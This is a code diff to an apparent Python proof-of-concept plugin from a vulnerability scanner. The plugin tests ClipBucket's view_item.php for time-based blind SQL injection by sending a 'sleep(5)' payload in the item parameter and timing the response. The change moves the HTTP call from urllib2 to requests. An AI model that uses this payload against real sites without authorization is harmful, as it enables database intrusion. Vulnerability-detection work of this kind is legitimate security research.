@@ -43,12 +43,11 @@ class Poc(ABPoc):
             
             payload = '/clipbucket/view_item.php?item=a%27and%20sleep(5)-- # &type=photos&collection=9'
             start_time = time.time()
-            request = urllib2.Request(self.target + payload)
-            response = urllib2.urlopen(request)
-            page = response.read()
+            response = requests.get(self.target + payload)
+            _page = response.text
 
             if time.time() - start_time > 5:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
         except Exception, e:
